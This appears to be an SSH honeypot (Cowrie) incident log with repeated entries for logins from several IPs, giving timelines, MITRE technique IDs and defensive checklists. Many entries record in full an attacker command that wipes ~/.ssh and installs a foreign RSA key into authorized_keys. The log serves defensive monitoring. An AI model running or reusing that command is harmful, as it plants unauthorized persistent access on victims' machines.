| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:20:05` | `cowrie.session.connect` |
| `2026-06-14 05:20:05` | `cowrie.client.version` |
| `2026-06-14 05:20:05` | `cowrie.client.kex` |
| `2026-06-14 05:20:05` | `cowrie.login.success` |
| `2026-06-14 05:20:06` | `cowrie.session.params` |
| `2026-06-14 05:20:06` | `cowrie.command.input` |
| `2026-06-14 05:20:06` | `cowrie.command.failed` |
| `2026-06-14 05:20:06` | `cowrie.log.closed` |
| `2026-06-14 05:20:06` | `cowrie.session.params` |
| `2026-06-14 05:20:06` | `cowrie.command.input` |
| `2026-06-14 05:20:06` | `cowrie.session.file_download` |
| `2026-06-14 05:20:06` | `cowrie.log.closed` |
| `2026-06-14 05:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65e19db12f6b

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:20 |
| **Last Seen** | 2026-06-14 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:20:08` | `cowrie.session.connect` |
| `2026-06-14 05:20:08` | `cowrie.client.version` |
| `2026-06-14 05:20:09` | `cowrie.client.kex` |
| `2026-06-14 05:20:09` | `cowrie.login.success` |
| `2026-06-14 05:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a984c8000ce

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:36 |
| **Last Seen** | 2026-06-14 05:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:36:18` | `cowrie.session.connect` |
| `2026-06-14 05:36:18` | `cowrie.client.version` |
| `2026-06-14 05:36:18` | `cowrie.client.kex` |
| `2026-06-14 05:36:18` | `cowrie.login.success` |
| `2026-06-14 05:36:19` | `cowrie.session.params` |
| `2026-06-14 05:36:19` | `cowrie.command.input` |
| `2026-06-14 05:36:19` | `cowrie.command.failed` |
| `2026-06-14 05:36:19` | `cowrie.log.closed` |
| `2026-06-14 05:36:19` | `cowrie.session.params` |
| `2026-06-14 05:36:19` | `cowrie.command.input` |
| `2026-06-14 05:36:19` | `cowrie.session.file_download` |
| `2026-06-14 05:36:19` | `cowrie.log.closed` |
| `2026-06-14 05:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60969f434a95

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:36 |
| **Last Seen** | 2026-06-14 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:36:21` | `cowrie.session.connect` |
| `2026-06-14 05:36:21` | `cowrie.client.version` |
| `2026-06-14 05:36:22` | `cowrie.client.kex` |
| `2026-06-14 05:36:22` | `cowrie.login.success` |
| `2026-06-14 05:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a72e619dc01c

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:42 |
| **Last Seen** | 2026-06-14 05:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:42:33` | `cowrie.session.connect` |
| `2026-06-14 05:42:33` | `cowrie.client.version` |
| `2026-06-14 05:42:33` | `cowrie.client.kex` |
| `2026-06-14 05:42:34` | `cowrie.login.success` |
| `2026-06-14 05:42:34` | `cowrie.session.params` |
| `2026-06-14 05:42:34` | `cowrie.command.input` |
| `2026-06-14 05:42:34` | `cowrie.command.failed` |
| `2026-06-14 05:42:34` | `cowrie.log.closed` |
| `2026-06-14 05:42:34` | `cowrie.session.params` |
| `2026-06-14 05:42:34` | `cowrie.command.input` |
| `2026-06-14 05:42:34` | `cowrie.session.file_download` |
| `2026-06-14 05:42:34` | `cowrie.log.closed` |
| `2026-06-14 05:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7d9adf92932

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:42 |
| **Last Seen** | 2026-06-14 05:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:42:37` | `cowrie.session.connect` |
| `2026-06-14 05:42:37` | `cowrie.client.version` |
| `2026-06-14 05:42:37` | `cowrie.client.kex` |
| `2026-06-14 05:42:37` | `cowrie.login.success` |
| `2026-06-14 05:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2726aad6336b

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:46 |
| **Last Seen** | 2026-06-14 05:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:46:42` | `cowrie.session.connect` |
| `2026-06-14 05:46:42` | `cowrie.client.version` |
| `2026-06-14 05:46:42` | `cowrie.client.kex` |
| `2026-06-14 05:46:43` | `cowrie.login.success` |
| `2026-06-14 05:46:43` | `cowrie.session.params` |
| `2026-06-14 05:46:43` | `cowrie.command.input` |
| `2026-06-14 05:46:43` | `cowrie.command.failed` |
| `2026-06-14 05:46:43` | `cowrie.log.closed` |
| `2026-06-14 05:46:43` | `cowrie.session.params` |
| `2026-06-14 05:46:43` | `cowrie.command.input` |
| `2026-06-14 05:46:43` | `cowrie.session.file_download` |
| `2026-06-14 05:46:43` | `cowrie.log.closed` |
| `2026-06-14 05:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dbfabac7f09

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:46 |
| **Last Seen** | 2026-06-14 05:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:46:46` | `cowrie.session.connect` |
| `2026-06-14 05:46:46` | `cowrie.client.version` |
| `2026-06-14 05:46:46` | `cowrie.client.kex` |
| `2026-06-14 05:46:46` | `cowrie.login.success` |
| `2026-06-14 05:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053cff12dfe4

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:48 |
| **Last Seen** | 2026-06-14 05:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:48:42` | `cowrie.session.connect` |
| `2026-06-14 05:48:42` | `cowrie.client.version` |
| `2026-06-14 05:48:43` | `cowrie.client.kex` |
| `2026-06-14 05:48:43` | `cowrie.login.success` |
| `2026-06-14 05:48:43` | `cowrie.session.params` |
| `2026-06-14 05:48:43` | `cowrie.command.input` |
| `2026-06-14 05:48:43` | `cowrie.command.failed` |
| `2026-06-14 05:48:44` | `cowrie.log.closed` |
| `2026-06-14 05:48:44` | `cowrie.session.params` |
| `2026-06-14 05:48:44` | `cowrie.command.input` |
| `2026-06-14 05:48:44` | `cowrie.session.file_download` |
| `2026-06-14 05:48:44` | `cowrie.log.closed` |
| `2026-06-14 05:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c60bbfaa04b

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-06-14 05:48 |
| **Last Seen** | 2026-06-14 05:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 05:48:46` | `cowrie.session.connect` |
| `2026-06-14 05:48:46` | `cowrie.client.version` |
| `2026-06-14 05:48:46` | `cowrie.client.kex` |
| `2026-06-14 05:48:47` | `cowrie.login.success` |
| `2026-06-14 05:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f09439d32b5f

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 06:32 |
| **Last Seen** | 2026-06-14 06:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:32:12` | `cowrie.session.connect` |
| `2026-06-14 06:32:12` | `cowrie.client.version` |
| `2026-06-14 06:32:12` | `cowrie.client.kex` |
| `2026-06-14 06:32:13` | `cowrie.login.success` |
| `2026-06-14 06:32:14` | `cowrie.session.params` |
| `2026-06-14 06:32:14` | `cowrie.command.input` |
| `2026-06-14 06:32:14` | `cowrie.command.failed` |
| `2026-06-14 06:32:14` | `cowrie.log.closed` |
| `2026-06-14 06:32:15` | `cowrie.session.params` |
| `2026-06-14 06:32:15` | `cowrie.command.input` |
| `2026-06-14 06:32:15` | `cowrie.session.file_download` |
| `2026-06-14 06:32:15` | `cowrie.log.closed` |
| `2026-06-14 06:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f32ea7c270

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 06:32 |
| **Last Seen** | 2026-06-14 06:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:32:18` | `cowrie.session.connect` |
| `2026-06-14 06:32:18` | `cowrie.client.version` |
| `2026-06-14 06:32:18` | `cowrie.client.kex` |
| `2026-06-14 06:32:19` | `cowrie.login.success` |
| `2026-06-14 06:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09817ffad1f8

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 06:37 |
| **Last Seen** | 2026-06-14 06:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:37:36` | `cowrie.session.connect` |
| `2026-06-14 06:37:36` | `cowrie.client.version` |
| `2026-06-14 06:37:37` | `cowrie.client.kex` |
| `2026-06-14 06:37:38` | `cowrie.login.success` |
| `2026-06-14 06:37:38` | `cowrie.session.params` |
| `2026-06-14 06:37:38` | `cowrie.command.input` |
| `2026-06-14 06:37:38` | `cowrie.command.failed` |
| `2026-06-14 06:37:39` | `cowrie.log.closed` |
| `2026-06-14 06:37:39` | `cowrie.session.params` |
| `2026-06-14 06:37:39` | `cowrie.command.input` |
| `2026-06-14 06:37:39` | `cowrie.session.file_download` |
| `2026-06-14 06:37:39` | `cowrie.log.closed` |
| `2026-06-14 06:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd734b168621

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 06:37 |
| **Last Seen** | 2026-06-14 06:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:37:42` | `cowrie.session.connect` |
| `2026-06-14 06:37:42` | `cowrie.client.version` |
| `2026-06-14 06:37:42` | `cowrie.client.kex` |
| `2026-06-14 06:37:43` | `cowrie.login.success` |
| `2026-06-14 06:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99e27402bed

| Field | Detail |
|---|---|
| **Source IP** | `119.96.174[.]235` |
| **First Seen** | 2026-06-14 06:39 |
| **Last Seen** | 2026-06-14 06:39 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:39:08` | `cowrie.session.connect` |
| `2026-06-14 06:39:08` | `cowrie.client.version` |
| `2026-06-14 06:39:08` | `cowrie.client.kex` |
| `2026-06-14 06:39:10` | `cowrie.login.success` |
| `2026-06-14 06:39:10` | `cowrie.session.params` |
| `2026-06-14 06:39:10` | `cowrie.command.input` |
| `2026-06-14 06:39:10` | `cowrie.command.failed` |
| `2026-06-14 06:39:16` | `cowrie.log.closed` |
| `2026-06-14 06:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.174[.]235` to AbuseIPDB if not already reported
- [ ] Block `119.96.174[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a93f70c6e49

| Field | Detail |
|---|---|
| **Source IP** | `119.96.174[.]235` |
| **First Seen** | 2026-06-14 06:39 |
| **Last Seen** | 2026-06-14 06:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:39:23` | `cowrie.session.connect` |
| `2026-06-14 06:39:23` | `cowrie.client.version` |
| `2026-06-14 06:39:23` | `cowrie.client.kex` |
| `2026-06-14 06:39:23` | `cowrie.login.success` |
| `2026-06-14 06:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.174[.]235` to AbuseIPDB if not already reported
- [ ] Block `119.96.174[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a88323d949f8

| Field | Detail |
|---|---|
| **Source IP** | `186.57.3[.]137` |
| **First Seen** | 2026-06-14 06:42 |
| **Last Seen** | 2026-06-14 06:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:42:26` | `cowrie.session.connect` |
| `2026-06-14 06:42:26` | `cowrie.client.version` |
| `2026-06-14 06:42:26` | `cowrie.client.kex` |
| `2026-06-14 06:42:28` | `cowrie.login.success` |
| `2026-06-14 06:42:28` | `cowrie.session.params` |
| `2026-06-14 06:42:28` | `cowrie.command.input` |
| `2026-06-14 06:42:28` | `cowrie.command.failed` |
| `2026-06-14 06:42:29` | `cowrie.log.closed` |
| `2026-06-14 06:42:29` | `cowrie.session.params` |
| `2026-06-14 06:42:29` | `cowrie.command.input` |
| `2026-06-14 06:42:30` | `cowrie.session.file_download` |
| `2026-06-14 06:42:30` | `cowrie.log.closed` |
| `2026-06-14 06:42:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.57.3[.]137` to AbuseIPDB if not already reported
- [ ] Block `186.57.3[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34da00606110

| Field | Detail |
|---|---|
| **Source IP** | `186.57.3[.]137` |
| **First Seen** | 2026-06-14 06:42 |
| **Last Seen** | 2026-06-14 06:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:42:34` | `cowrie.session.connect` |
| `2026-06-14 06:42:34` | `cowrie.client.version` |
| `2026-06-14 06:42:34` | `cowrie.client.kex` |
| `2026-06-14 06:42:35` | `cowrie.login.success` |
| `2026-06-14 06:42:36` | `cowrie.session.closed` |

